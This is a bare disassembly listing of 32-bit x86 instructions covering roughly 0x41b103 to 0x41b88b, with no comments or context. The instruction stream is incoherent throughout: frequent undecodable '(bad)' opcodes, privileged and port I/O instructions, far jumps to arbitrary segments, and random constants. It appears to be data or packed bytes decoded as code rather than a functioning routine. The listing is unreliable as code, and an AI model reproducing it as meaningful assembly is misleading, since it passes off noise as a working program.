  41b103:	fistp  QWORD PTR [esp+esi*1]
  41b106:	push   DWORD PTR [eax]
  41b108:	pop    ss
  41b109:	adc    ch,BYTE PTR [eax*8-0xc4867a6]
  41b110:	test   eax,0x3e47b13
  41b115:	js     0x41b137
  41b117:	(bad)  
  41b118:	ror    DWORD PTR [eax],cl
  41b11a:	fisttp WORD PTR [ecx]
  41b11c:	into   
  41b11d:	loopne 0x41b0fc
  41b11f:	cmovnp ebx,DWORD PTR [esi+0x3b120d4a]
  41b126:	rcl    DWORD PTR [esi-0x986450f],1
  41b12c:	(bad)  
  41b12d:	jb     0x41b150
  41b12f:	call   0x7c16:0x980e2cc4
  41b136:	mov    esi,0x7f8d0f7a
  41b13b:	in     al,0x9f
  41b13d:	pop    edi
  41b13e:	push   0x619e9477
  41b143:	outs   dx,BYTE PTR ds:[esi]
  41b144:	xchg   ecx,eax
  41b145:	ret    0xa54b
  41b148:	adc    BYTE PTR [eax+0x7a],ah
  41b14b:	mov    ah,dl
  41b14d:	pop    ebp
  41b14e:	pop    eax
  41b14f:	and    al,0x86
  41b151:	adc    dh,0x67
  41b154:	test   eax,0xa073af98
  41b159:	iret   
  41b15a:	ss test al,0xdb
  41b15d:	dec    ebx
  41b15e:	add    BYTE PTR [ebx+0x1da57a26],0x3d
  41b165:	loope  0x41b124
  41b167:	(bad)  
  41b169:	jno    0x41b0ed
  41b16b:	mov    bh,BYTE PTR ds:0x8b30dda2
  41b171:	add    al,0xed
  41b173:	imul   esp,eax,0x23
  41b176:	stos   DWORD PTR es:[edi],eax
  41b177:	cmp    dl,BYTE PTR [edi+0x5fb01825]
  41b17d:	hlt    
  41b17e:	daa    
  41b17f:	out    dx,eax
  41b180:	mov    eax,0xbc83a920
  41b185:	lock stc 
  41b187:	les    eax,FWORD PTR [eax-0x19c63ec5]
  41b18d:	or     dh,0xe2
  41b190:	add    ebx,DWORD PTR [edi+0x3e0b26ee]
  41b196:	mov    BYTE PTR [ecx-0x61a5ad21],al
  41b19c:	(bad)  [ecx+0x35]
  41b19f:	das    
  41b1a0:	test   BYTE PTR [esi-0x46],ch
  41b1a3:	repnz lods eax,DWORD PTR ds:[esi]
  41b1a5:	inc    esp
  41b1a6:	lea    edx,[edx]
  41b1a8:	mov    ds:0xf2ab0ac6,al
  41b1ad:	lock cs stos BYTE PTR es:[edi],al
  41b1b0:	mov    ch,0xc7
  41b1b2:	ins    BYTE PTR es:[edi],dx
  41b1b3:	jge    0x41b206
  41b1b5:	add    BYTE PTR ds:0x6155ff2a,dl
  41b1bb:	cmp    eax,0x1ac7871
  41b1c0:	fadd   st(1),st
  41b1c2:	ds dec eax
  41b1c4:	out    0xa0,eax
  41b1c6:	fnstsw ax
  41b1c8:	push   es
  41b1c9:	es inc esi
  41b1cb:	add    bl,dl
  41b1cd:	dec    esi
  41b1ce:	rcr    dh,0x32
  41b1d1:	rol    DWORD PTR [esi+0x66612e1a],0xdc
  41b1d8:	cmp    dh,ah
  41b1da:	cmovs  edi,DWORD PTR [ecx]
  41b1dd:	pop    ds
  41b1de:	sbb    BYTE PTR [esp+ebx*4+0x54],dh
  41b1e2:	inc    ebp
  41b1e3:	call   0x27545c58
  41b1e8:	int3   
  41b1e9:	pop    eax
  41b1ea:	mov    ecx,0x88868e9f
  41b1ef:	xlat   BYTE PTR ds:[ebx]
  41b1f0:	dec    ecx
  41b1f1:	(bad)  
  41b1f2:	scas   al,BYTE PTR es:[edi]
  41b1f3:	scas   al,BYTE PTR es:[edi]
  41b1f4:	scas   al,BYTE PTR es:[edi]
  41b1f5:	pop    edx
  41b1f6:	cmp    al,0xff
  41b1f8:	je     0x41b25b
  41b1fa:	nop
  41b1fb:	or     eax,0x1563dc5d
  41b200:	cdq    
  41b201:	and    bl,BYTE PTR [ebp-0x7506c6f4]
  41b207:	lods   eax,DWORD PTR ds:[esi]
  41b208:	and    ecx,DWORD PTR [ebx]
  41b20a:	minps  xmm0,XMMWORD PTR [edi+0x6d]
  41b20e:	cmc    
  41b20f:	sar    BYTE PTR [ebx+0x44],1
  41b212:	mov    al,ds:0x390542f1
  41b217:	lods   al,BYTE PTR ds:[esi]
  41b218:	(bad)  
  41b21a:	das    
  41b21b:	and    ebp,DWORD PTR [ecx-0x623f209c]
  41b221:	mov    ebx,DWORD PTR [esp+ecx*1+0x3cc7fdc2]
  41b228:	repz lock rcr DWORD PTR [ecx],cl
  41b22c:	push   eax
  41b22d:	ss cdq 
  41b22f:	loop   0x41b1cd
  41b231:	ffree  st(2)
  41b233:	int3   
  41b234:	xor    BYTE PTR ss:[edx-0xad72bc9],bh
  41b23b:	adc    dl,BYTE PTR [esi]
  41b23d:	push   ss
  41b23e:	inc    ebx
  41b23f:	mov    al,ds:0xf415d2fc
  41b245:	shl    DWORD PTR [esi],1
  41b247:	pusha  
  41b248:	repnz pop ds
  41b24a:	mov    ch,0x19
  41b24c:	imul   esi,DWORD PTR [ebp+0x79],0xffffff83
  41b250:	jg     0x41b1fb
  41b252:	shl    DWORD PTR [eax+0xb],0x22
  41b256:	sbb    BYTE PTR [eax+0x3],al
  41b259:	jbe    0x41b26e
  41b25b:	cmp    al,0xd2
  41b25d:	adc    BYTE PTR [edi],bh
  41b25f:	sbb    DWORD PTR [esp+ebp*4+0x11],esi
  41b263:	das    
  41b264:	test   eax,0xd3bca69c
  41b269:	mov    eax,0x628923c7
  41b26e:	jne    0x41b285
  41b270:	cmp    DWORD PTR [ebx+0x7e],ebp
  41b273:	xchg   edx,eax
  41b274:	dec    ebp
  41b275:	ins    DWORD PTR es:[edi],dx
  41b276:	test   DWORD PTR [ecx],edx
  41b278:	shl    BYTE PTR [edx+0x60],cl
  41b27b:	das    
  41b27c:	ficomp DWORD PTR [ecx-0x31]
  41b27f:	inc    esp
  41b280:	xchg   esi,eax
  41b281:	ret    
  41b282:	mov    dl,0xea
  41b284:	push   ebp
  41b285:	ss cmp al,0xd1
  41b288:	xor    eax,DWORD PTR [ebx+ebp*4]
  41b28b:	sub    ch,BYTE PTR [edx-0x19]
  41b28e:	jbe    0x41b25c
  41b290:	enter  0x3fc7,0xda
  41b294:	jg     0x41b263
  41b296:	sti    
  41b297:	push   ds
  41b298:	pop    edi
  41b299:	(bad)  [esi]
  41b29b:	mov    eax,ds:0x56b144aa
  41b2a0:	cmp    eax,0x571bba08
  41b2a5:	nop
  41b2a6:	xchg   DWORD PTR [ebp-0x304ac9f1],esp
  41b2ac:	mov    al,0x94
  41b2ae:	mov    eax,0x86b95e0a
  41b2b3:	mov    ebp,0xe978733a
  41b2b8:	stc    
  41b2b9:	lock in eax,0x9c
  41b2bc:	(bad)  
  41b2bd:	jmp    0xdd6c2674
  41b2c2:	jno    0x41b33b
  41b2c4:	sbb    edx,ebp
  41b2c6:	pop    eax
  41b2c7:	push   edx
  41b2c8:	add    al,0x90
  41b2ca:	pop    edi
  41b2cb:	xor    ebx,DWORD PTR [esi-0x65]
  41b2ce:	mov    WORD PTR fs:[edi],ss
  41b2d1:	aaa    
  41b2d2:	ja     0x41b2dc
  41b2d4:	xchg   BYTE PTR ds:[esi],al
  41b2d7:	xchg   esi,eax
  41b2d8:	jnp    0x41b2e5
  41b2da:	sub    esp,DWORD PTR [eax+ecx*4-0xb0f010a]
  41b2e1:	fild   DWORD PTR [ebx-0x28]
  41b2e4:	pop    esp
  41b2e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2e6:	mov    edx,0x1017b5f8
  41b2eb:	cmp    eax,0xec874116
  41b2f0:	mov    ds:0x6ca3bdf3,eax
  41b2f5:	xor    al,BYTE PTR [edx-0x4f5f7f8c]
  41b2fb:	push   ss
  41b2fc:	adc    DWORD PTR [ecx+0x2d],edx
  41b2ff:	jg     0x41b2cf
  41b301:	xchg   esi,eax
  41b302:	call   0xf8debb8f
  41b307:	mov    ecx,0x7c10abc0
  41b30c:	sub    DWORD PTR [edi+0x1c],0x66884bfb
  41b313:	in     al,dx
  41b314:	jge    0x41b2b5
  41b316:	mov    esi,0x2ce3a1cc
  41b31b:	rol    BYTE PTR [ebp-0x6c099ef8],0x46
  41b322:	mov    ch,0x2f
  41b324:	cli    
  41b325:	rcl    ebp,0x26
  41b328:	sti    
  41b329:	aaa    
  41b32a:	dec    ebx
  41b32b:	(bad)  
  41b32c:	xchg   esi,esp
  41b32e:	out    dx,eax
  41b32f:	ins    DWORD PTR es:[edi],dx
  41b330:	call   0x2eb8:0x62a17d4
  41b337:	mov    ds:0x8e87adf3,eax
  41b33c:	clc    
  41b33d:	jecxz  0x41b312
  41b33f:	ins    DWORD PTR es:[edi],dx
  41b340:	inc    ebp
  41b341:	xchg   edx,eax
  41b342:	fisttp DWORD PTR ds:0x106004b1
  41b348:	push   0xffffffb2
  41b34a:	scas   eax,DWORD PTR es:[edi]
  41b34b:	fsubr  QWORD PTR [esi]
  41b34d:	loope  0x41b37d
  41b34f:	int    0x16
  41b351:	cmp    DWORD PTR [ecx+0x59c51628],esi
  41b357:	mov    al,ds:0x9396e756
  41b35c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b35d:	aam    0xc6
  41b35f:	push   cs
  41b360:	(bad)  
  41b361:	shl    BYTE PTR [ebx],1
  41b363:	stos   DWORD PTR es:[edi],eax
  41b364:	rcl    BYTE PTR [eax],1
  41b366:	(bad)  
  41b367:	jnp    0x41b3ac
  41b369:	int    0x44
  41b36b:	nop
  41b36c:	out    0x2b,eax
  41b36e:	and    BYTE PTR [eax+0x37a41897],0x57
  41b375:	jmp    0x12c7:0xbdc6827d
  41b37c:	dec    eax
  41b37d:	mov    dl,0x99
  41b37f:	sbb    eax,0xc41c9fd2
  41b384:	add    BYTE PTR [edx+0x58],dh
  41b387:	adc    eax,0x409c6af7
  41b38c:	mov    edx,0xe035d9b8
  41b391:	gs jo  0x41b407
  41b394:	outs   dx,DWORD PTR ds:[esi]
  41b395:	mov    dl,0x60
  41b397:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b399:	inc    ebx
  41b39a:	sub    eax,0x910173eb
  41b39f:	jbe    0x41b3bb
  41b3a1:	bound  esp,QWORD PTR [edx]
  41b3a3:	xchg   esp,eax
  41b3a4:	jns    0x41b419
  41b3a6:	call   0x87b2:0xd1b6ba6f
  41b3ad:	dec    ecx
  41b3ae:	std    
  41b3af:	inc    ebx
  41b3b0:	sub    ah,BYTE PTR [eax-0x5f]
  41b3b3:	push   ds
  41b3b4:	jp     0x41b3d6
  41b3b6:	xor    ebx,edx
  41b3b8:	or     DWORD PTR [ebp-0x11],ebx
  41b3bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3bc:	mov    al,ds:0x550efe16
  41b3c1:	xor    cl,BYTE PTR [edx+edx*4-0x13360615]
  41b3c8:	add    BYTE PTR [eax-0x34],ch
  41b3cb:	push   ss
  41b3cc:	push   esi
  41b3cd:	mov    ds:0x42d97c38,al
  41b3d2:	inc    ecx
  41b3d3:	jo     0x41b3db
  41b3d5:	sbb    DWORD PTR [edx-0x4f],esp
  41b3d8:	or     DWORD PTR ds:0xf047483a,ebp
  41b3de:	stos   BYTE PTR es:[edi],al
  41b3df:	xchg   ecx,eax
  41b3e0:	sbb    esi,DWORD PTR [eax+0x3bfa9906]
  41b3e6:	lea    ebx,[esi+eax*1-0x62587f6d]
  41b3ed:	xlat   BYTE PTR ds:[ebx]
  41b3ee:	cmp    eax,0xc037b616
  41b3f3:	dec    esi
  41b3f4:	push   eax
  41b3f5:	mov    ebx,0xdb2198fd
  41b3fa:	xor    bl,BYTE PTR [ebx]
  41b3fc:	sub    al,0x3e
  41b3fe:	sub    cl,BYTE PTR [ebx+0x2579a212]
  41b404:	into   
  41b405:	call   0x15a2f147
  41b40a:	loop   0x41b411
  41b40c:	gs (bad) 
  41b40e:	(bad)  
  41b40f:	fadd   DWORD PTR [ebx-0x27e335d8]
  41b415:	adc    bl,ch
  41b417:	out    0xd2,al
  41b419:	xchg   edi,eax
  41b41a:	mov    ebp,0xf496eda0
  41b41f:	push   0xffffffee
  41b421:	test   eax,0xf567277a
  41b426:	sub    al,0x9d
  41b428:	mov    ch,0x26
  41b42a:	pop    ebp
  41b42b:	add    eax,edi
  41b42d:	pop    ss
  41b42e:	ins    DWORD PTR es:[edi],dx
  41b42f:	(bad)  
  41b430:	sbb    edi,esi
  41b432:	das    
  41b433:	leave  
  41b434:	imul   ebx,DWORD PTR [edi+ecx*2+0x34],0x48
  41b439:	scas   eax,DWORD PTR es:[edi]
  41b43a:	call   0x986125cb
  41b43f:	mov    ds:0xdc23924d,al
  41b444:	outs   dx,WORD PTR ds:[esi]
  41b446:	ret    0x3989
  41b449:	sub    eax,0xef1456c8
  41b44e:	mov    ds:0x6a370ff6,al
  41b453:	mov    bh,0x4e
  41b455:	inc    esp
  41b456:	xchg   esp,eax
  41b457:	add    DWORD PTR [esi+ecx*4],esp
  41b45a:	inc    edx
  41b45b:	inc    ecx
  41b45c:	sbb    BYTE PTR [ebx+0x1d],dl
  41b45f:	mov    ebx,0x1f5ac2d0
  41b464:	mov    ecx,0xd6ffa900
  41b469:	loope  0x41b401
  41b46b:	das    
  41b46c:	test   eax,0x1991c605
  41b471:	pop    es
  41b472:	outs   dx,DWORD PTR ds:[esi]
  41b473:	loope  0x41b4ce
  41b475:	dec    esp
  41b476:	and    dl,BYTE PTR [edx]
  41b478:	mov    ah,0xc7
  41b47a:	stos   BYTE PTR es:[edi],al
  41b47b:	pop    edx
  41b47c:	xor    BYTE PTR [edi-0x264de720],bl
  41b482:	pop    esp
  41b483:	(bad)  
  41b485:	nop
  41b486:	push   0x16657c16
  41b48b:	aam    0x86
  41b48d:	in     eax,0x2f
  41b48f:	fistp  DWORD PTR [eax-0x36]
  41b492:	cs sub eax,0x4f0a5d07
  41b498:	arpl   cx,cx
  41b49a:	jnp    0x41b470
  41b49c:	mov    ch,0xa8
  41b49e:	gs stc 
  41b4a0:	jne    0x41b45f
  41b4a2:	or     ebp,ebp
  41b4a4:	ss cs fwait
  41b4a7:	pop    ecx
  41b4a8:	mov    al,0xbf
  41b4aa:	mov    DWORD PTR [ebp-0x19e3a88],edi
  41b4b0:	loop   0x41b4ac
  41b4b2:	shr    BYTE PTR [ebp+ecx*2+0x19],cl
  41b4b6:	mov    dh,0xf8
  41b4b8:	mov    ebx,0xdd65b150
  41b4bd:	sub    edi,esp
  41b4bf:	lods   eax,DWORD PTR ds:[esi]
  41b4c0:	aad    0x75
  41b4c2:	push   ebp
  41b4c3:	dec    ecx
  41b4c4:	push   edx
  41b4c5:	xchg   dl,ah
  41b4c7:	mov    bl,0xa9
  41b4c9:	adc    esi,DWORD PTR [ebp-0x36]
  41b4cc:	dec    edi
  41b4cd:	out    0x50,al
  41b4cf:	repnz inc esp
  41b4d1:	sbb    ebp,edi
  41b4d3:	das    
  41b4d4:	xor    eax,0x60c5ba4e
  41b4d9:	fisub  DWORD PTR [ecx+0x5bcb3b62]
  41b4df:	adc    DWORD PTR [esi],esp
  41b4e1:	pop    esp
  41b4e2:	out    dx,al
  41b4e3:	loop   0x41b4fc
  41b4e5:	mov    esi,0x6c1b013d
  41b4ea:	jnp    0x41b482
  41b4ec:	mov    edi,0xf82c7289
  41b4f1:	dec    edi
  41b4f2:	sti    
  41b4f3:	add    DWORD PTR [ecx+0x2c],edi
  41b4f6:	push   cs
  41b4f7:	and    bh,BYTE PTR [edx+0x26536345]
  41b4fd:	lahf   
  41b4fe:	jmp    0x41b4f6
  41b500:	and    BYTE PTR [ebx-0x2b],al
  41b503:	jmp    FWORD PTR [esi]
  41b505:	in     eax,0xb5
  41b507:	pop    ecx
  41b508:	std    
  41b509:	pop    edx
  41b50a:	xor    ebx,DWORD PTR [ebp+edi*8+0x78b6b737]
  41b511:	push   0x5a
  41b513:	repz jmp 0x82a148fc
  41b519:	xchg   BYTE PTR gs:[ecx+edx*8-0x3b],ah
  41b51e:	retf   
  41b51f:	(bad)  
  41b520:	adc    bh,cl
  41b522:	das    
  41b523:	cdq    
  41b524:	sub    dl,BYTE PTR [eax+edi*4+0x4763e79c]
  41b52b:	rol    DWORD PTR [esi],0xba
  41b52e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b52f:	mov    edx,ss
  41b531:	(bad)  
  41b532:	lods   al,BYTE PTR ds:[esi]
  41b533:	mov    al,0x8f
  41b535:	jne    0x41b4ee
  41b537:	mov    cl,0xc6
  41b539:	add    bh,BYTE PTR [edi+0x1]
  41b53c:	fdivr  st(5),st
  41b53e:	les    edx,FWORD PTR [edx+0x1be17e9a]
  41b544:	retf   
  41b545:	aaa    
  41b546:	shl    eax,cl
  41b548:	and    ah,BYTE PTR [ebx-0x5]
  41b54b:	ss ins DWORD PTR es:[edi],dx
  41b54d:	adc    al,0x63
  41b54f:	xchg   esp,eax
  41b550:	js     0x41b58b
  41b552:	nop
  41b553:	retf   0x3fd8
  41b556:	dec    ecx
  41b557:	xchg   esp,eax
  41b558:	pushf  
  41b559:	iret   
  41b55a:	pop    esi
  41b55b:	popf   
  41b55c:	pop    edx
  41b55d:	jo     0x41b504
  41b55f:	mov    ebp,0x1578ca90
  41b564:	mov    dl,0x65
  41b566:	adc    ebx,edx
  41b568:	pop    DWORD PTR [eax+0x710b3a05]
  41b56e:	lahf   
  41b56f:	ins    BYTE PTR es:[edi],dx
  41b570:	lods   eax,DWORD PTR ds:[esi]
  41b571:	sub    edx,DWORD PTR ds:0xc658dcd6
  41b577:	or     eax,eax
  41b579:	mov    al,ds:0x7b58cbaa
  41b57e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b57f:	repnz mov al,0x17
  41b582:	ja     0x41b5f8
  41b584:	add    DWORD PTR [esi],esp
  41b586:	(bad)  
  41b587:	stos   DWORD PTR es:[edi],eax
  41b588:	xchg   DWORD PTR [esi],edi
  41b58a:	stos   BYTE PTR es:[edi],al
  41b58b:	fcomp  st(3)
  41b58d:	int3   
  41b58e:	lds    ebx,FWORD PTR [edx+esi*1+0x791ec9cc]
  41b595:	mov    ch,0xf5
  41b597:	loop   0x41b60f
  41b599:	adc    ecx,0xffffff80
  41b59c:	pop    ss
  41b59d:	(bad)  [edi]
  41b59f:	ins    BYTE PTR es:[edi],dx
  41b5a0:	xacquire xchg DWORD PTR [ebx+0x7403449f],ebp
  41b5a7:	push   es
  41b5a8:	and    dh,BYTE PTR [ebx]
  41b5aa:	mov    ah,0xcd
  41b5ac:	and    al,0x8e
  41b5ae:	push   ebx
  41b5af:	int3   
  41b5b0:	test   BYTE PTR [ebp*4+0x55b6684],dl
  41b5b7:	push   cs
  41b5b8:	addr16 jns 0x41b581
  41b5bb:	cdq    
  41b5bc:	arpl   WORD PTR ds:0x2544e21a,ax
  41b5c2:	pop    es
  41b5c3:	das    
  41b5c4:	rol    DWORD PTR [eax+0x23],0x13
  41b5c8:	dec    ebx
  41b5c9:	in     eax,0xed
  41b5cb:	and    al,BYTE PTR [esi+0x2]
  41b5ce:	loopne 0x41b614
  41b5d0:	jg     0x41b650
  41b5d2:	sahf   
  41b5d3:	dec    ebx
  41b5d4:	push   edx
  41b5d5:	adc    dh,BYTE PTR [edx-0x33]
  41b5d8:	setns  BYTE PTR [edx+ebx*2+0x336456c5]
  41b5e0:	popa   
  41b5e1:	dec    edx
  41b5e2:	mov    ds:0x761ea95c,eax
  41b5e7:	push   cs
  41b5e8:	imul   ebx,ebp,0xcccbb641
  41b5ee:	loope  0x41b577
  41b5f0:	in     eax,dx
  41b5f1:	and    ecx,ebp
  41b5f3:	mov    ebp,0x6bf68855
  41b5f8:	lds    ebx,FWORD PTR [eax+0x7318a86d]
  41b5fe:	popf   
  41b5ff:	xchg   ebp,eax
  41b600:	test   DWORD PTR [eax],esp
  41b602:	(bad)  
  41b603:	push   ss
  41b604:	fwait
  41b605:	call   0xc7c52f36
  41b60a:	mov    eax,0x323e4aec
  41b60f:	mov    ds:0xb4c363c1,eax
  41b614:	dec    ebx
  41b615:	ja     0x41b695
  41b617:	cmc    
  41b618:	xchg   esi,eax
  41b619:	mov    ds:0x91ea37ae,eax
  41b61e:	lea    ebp,[edx]
  41b620:	pop    es
  41b621:	sub    eax,0x7b4daa42
  41b626:	mov    al,0x2e
  41b628:	sbb    ebp,DWORD PTR [edx]
  41b62a:	push   ebx
  41b62b:	xor    al,0x95
  41b62d:	xor    eax,0x83ea292
  41b632:	shl    eax,1
  41b634:	imul   edi,DWORD PTR [ebx+0x20a98b6e],0xffffffdb
  41b63b:	pop    esp
  41b63c:	mov    ds:0x99931f2c,al
  41b641:	loope  0x41b607
  41b643:	jae    0x41b5dd
  41b645:	push   edx
  41b646:	xchg   edx,eax
  41b647:	xor    ch,BYTE PTR [edx-0x3e]
  41b64a:	lods   eax,DWORD PTR ds:[esi]
  41b64b:	in     eax,0x29
  41b64d:	jmp    0x7906:0xb234fcdb
  41b654:	mov    edx,0xe0171e14
  41b659:	(bad)  
  41b65a:	adc    esp,edx
  41b65c:	shl    DWORD PTR ds:0x5286a59f,cl
  41b662:	push   ebp
  41b663:	or     dl,BYTE PTR [ebx]
  41b665:	push   eax
  41b666:	scas   eax,DWORD PTR es:[edi]
  41b667:	fst    DWORD PTR [edi]
  41b669:	add    al,0xb2
  41b66b:	iret   
  41b66c:	add    DWORD PTR [edx],esi
  41b66e:	inc    ebp
  41b66f:	xchg   edx,esp
  41b671:	jmp    0xfa84:0xf5ad4f16
  41b678:	mov    al,0x2a
  41b67a:	pop    ss
  41b67b:	scas   al,BYTE PTR es:[edi]
  41b67c:	adc    eax,0xa795f43a
  41b681:	or     DWORD PTR [eax+0x3a],ecx
  41b684:	dec    eax
  41b685:	fisub  WORD PTR [ecx-0x517757d8]
  41b68b:	adc    al,0x6c
  41b68d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b68e:	sbb    cl,dl
  41b690:	xor    bh,BYTE PTR [edx-0x39]
  41b693:	push   edx
  41b694:	adc    dh,BYTE PTR [edi]
  41b696:	cmp    ah,ah
  41b698:	xor    edx,ebp
  41b69a:	out    0x42,al
  41b69c:	mov    DWORD PTR [edi-0xc],ebx
  41b69f:	cmp    bl,BYTE PTR [edi]
  41b6a1:	fs inc esi
  41b6a3:	jb     0x41b669
  41b6a5:	cld    
  41b6a6:	mov    ds:0x33e8d08f,al
  41b6ab:	mov    ecx,0x3ed01158
  41b6b0:	mov    BYTE PTR [ebp+0x7e],bl
  41b6b3:	jne    0x41b6fc
  41b6b5:	ins    BYTE PTR es:[edi],dx
  41b6b6:	cmovb  ebp,DWORD PTR [ebp+0xd8d9fa5]
  41b6bd:	sub    bh,BYTE PTR [ebx]
  41b6bf:	fstp   QWORD PTR [ebp-0x58]
  41b6c2:	fwait
  41b6c3:	hlt    
  41b6c4:	mov    edx,0x2d8c7f91
  41b6c9:	lahf   
  41b6ca:	std    
  41b6cb:	mov    ds:0x5f7142c7,al
  41b6d0:	add    edi,DWORD PTR [edi+0x1f]
  41b6d3:	or     eax,0x8df1b293
  41b6d8:	retf   
  41b6d9:	aaa    
  41b6da:	ja     0x41b699
  41b6dc:	leave  
  41b6dd:	out    0xd5,eax
  41b6df:	out    0x67,al
  41b6e1:	and    BYTE PTR [eax-0x3e],ch
  41b6e4:	dec    esp
  41b6e5:	rol    BYTE PTR ds:0x84161f3e,1
  41b6eb:	vpsubsw xmm6,xmm1,XMMWORD PTR [esi-0x2b9103c1]
  41b6f3:	cdq    
  41b6f4:	lods   al,BYTE PTR ds:[esi]
  41b6f5:	bound  ecx,QWORD PTR [ebx+0x470d72be]
  41b6fb:	dec    esp
  41b6fc:	dec    esi
  41b6fd:	enterw 0xfa56,0xc9
  41b702:	hlt    
  41b703:	inc    edx
  41b704:	xor    eax,ebp
  41b706:	aaa    
  41b707:	aam    0x4c
  41b709:	sbb    edx,DWORD PTR [edi]
  41b70b:	inc    ebp
  41b70c:	loop   0x41b6c5
  41b70e:	xchg   edi,ecx
  41b710:	rcl    DWORD PTR [esi],cl
  41b712:	jmp    0x7cdd:0x73c2265e
  41b719:	outs   dx,DWORD PTR ds:[esi]
  41b71a:	or     BYTE PTR [esi-0x3c],cl
  41b71d:	jbe    0x41b750
  41b71f:	push   esp
  41b720:	jne    0x41b6bc
  41b722:	or     ecx,edi
  41b724:	and    DWORD PTR [eax],edi
  41b726:	jmp    0x41b792
  41b728:	add    edi,DWORD PTR [ecx-0x63]
  41b72b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b72c:	mov    DWORD PTR [ebx],ecx
  41b72e:	dec    esp
  41b72f:	fcom   st(6)
  41b731:	das    
  41b732:	and    BYTE PTR [eax],cl
  41b734:	inc    edx
  41b735:	aas    
  41b736:	in     eax,dx
  41b737:	ror    DWORD PTR [ebx],cl
  41b739:	sti    
  41b73a:	xchg   ecx,eax
  41b73b:	test   al,ah
  41b73d:	fmul   DWORD PTR [ebp+0x4a922c11]
  41b743:	push   esp
  41b744:	(bad)  
  41b745:	pop    edi
  41b746:	cs cdq 
  41b748:	std    
  41b749:	sbb    al,0x4e
  41b74b:	outs   dx,DWORD PTR ds:[esi]
  41b74c:	daa    
  41b74d:	sbb    eax,DWORD PTR ds:0xd8f81d55
  41b753:	add    BYTE PTR es:[ecx],ah
  41b756:	dec    esp
  41b757:	sbb    al,0xd6
  41b759:	mov    ecx,0x2076cff2
  41b75e:	or     bh,BYTE PTR [ecx+0x240c5a05]
  41b764:	inc    BYTE PTR [esi+0x38]
  41b767:	sub    esi,esp
  41b769:	and    eax,0xfa9a9709
  41b76e:	cmp    eax,0xe0e7ecd
  41b773:	mov    esi,DWORD PTR [edi+0x3d]
  41b776:	pop    ecx
  41b777:	sub    ebp,DWORD PTR [edx-0x57b783ff]
  41b77d:	rcl    DWORD PTR [edi-0x15b43f93],0xd2
  41b784:	pushf  
  41b785:	stos   BYTE PTR es:[edi],al
  41b786:	push   ebp
  41b787:	jnp    0x41b74f
  41b789:	mov    ecx,0x41a2a743
  41b78e:	(bad)  
  41b78f:	and    DWORD PTR [esi],ebp
  41b791:	icebp  
  41b792:	inc    esp
  41b793:	xchg   cl,dl
  41b795:	int    0xd6
  41b797:	and    cl,BYTE PTR [esi]
  41b799:	pop    ds
  41b79a:	in     eax,dx
  41b79b:	pop    ds
  41b79c:	addr16 or eax,0xed8bd4a6
  41b7a2:	push   esi
  41b7a3:	and    DWORD PTR ds:0x231e156,ebp
  41b7a9:	dec    edi
  41b7aa:	fs (bad) 
  41b7ad:	das    
  41b7ae:	push   ebp
  41b7af:	fcmovu st,st(4)
  41b7b1:	fld    QWORD PTR [esi-0x4e]
  41b7b4:	jg     0x41b7f5
  41b7b6:	jl     0x41b741
  41b7b8:	inc    edi
  41b7b9:	or     ebp,DWORD PTR [edx-0x416b76db]
  41b7bf:	lock (bad) 
  41b7c1:	inc    ecx
  41b7c2:	xor    ch,BYTE PTR [eax-0x2f869124]
  41b7c8:	mov    eax,ds:0xba2d4ac5
  41b7cd:	cld    
  41b7ce:	int    0xde
  41b7d0:	std    
  41b7d1:	xor    eax,0x7c1012c2
  41b7d6:	or     ch,dh
  41b7d8:	jmp    0xf0ad:0xe3e6cba8
  41b7df:	inc    eax
  41b7e0:	mov    ah,0x29
  41b7e2:	(bad)
  41b7e7:	fisub  DWORD PTR [ebx-0xecc6eb7]
  41b7ed:	jle    0x41b7e0
  41b7ef:	jns    0x41b786
  41b7f1:	or     ecx,DWORD PTR [edi-0x6ed3fced]
  41b7f7:	add    DWORD PTR [ebx-0x3f7c2d8],0xffffffed
  41b7fe:	fwait
  41b7ff:	pop    es
  41b800:	mov    cs,esi
  41b802:	mov    ebx,0xb0202a1a
  41b807:	mov    WORD PTR [edx-0x28],?
  41b80a:	add    esp,DWORD PTR cs:[eax]
  41b80d:	sbb    DWORD PTR [ecx+0x22],edi
  41b810:	hlt    
  41b811:	cmp    dl,BYTE PTR [edi-0x3f]
  41b814:	mov    ah,0x94
  41b816:	xlat   BYTE PTR ds:[ebx]
  41b817:	sub    bl,dh
  41b819:	stc    
  41b81a:	(bad)  
  41b81c:	lea    ecx,[ecx+edx*1]
  41b81f:	push   esp
  41b820:	lods   al,BYTE PTR ds:[esi]
  41b821:	aas    
  41b822:	(bad)  
  41b823:	xchg   edi,eax
  41b824:	xor    cl,BYTE PTR [ecx+0x6b]
  41b827:	test   eax,0x1ef248b5
  41b82c:	retf   0x4fc8
  41b82f:	mov    esp,0xee2c8984
  41b834:	scas   al,BYTE PTR es:[edi]
  41b835:	mov    eax,0xba4ba03c
  41b83a:	test   eax,0xfd1a22b2
  41b83f:	xchg   esp,eax
  41b840:	iret   
  41b841:	jmp    FWORD PTR [eax+edx*8]
  41b844:	or     al,0x89
  41b846:	jp     0x41b7e4
  41b848:	inc    esi
  41b849:	mov    ch,0xc6
  41b84b:	add    edi,DWORD PTR ds:0xe7129dbe
  41b851:	ins    DWORD PTR es:[edi],dx
  41b852:	cmp    DWORD PTR [eax-0x14],edx
  41b855:	outs   dx,BYTE PTR ds:[esi]
  41b856:	lea    esp,[ebp+0x4b]
  41b859:	jns    0x41b871
  41b85b:	bound  ebp,QWORD PTR [ebx]
  41b85d:	lods   eax,DWORD PTR ds:[esi]
  41b85e:	int3   
  41b85f:	ficomp DWORD PTR [edx+0x42e343ca]
  41b865:	pop    edi
  41b866:	(bad)  
  41b867:	call   0x96f9c43a
  41b86c:	fisttp QWORD PTR [esi+edx*1-0x33]
  41b870:	call   0x20d6:0x7622e7c8
  41b877:	gs sbb eax,0xa6f87ab3
  41b87d:	mov    al,ds:0xaeedc631
  41b882:	call   0xd525997e
  41b887:	cmp    ah,0x93
  41b88a:	out    dx,eax
  41b88b:	mov    esi,DWORD PTR [esi+0x3925a4e4]
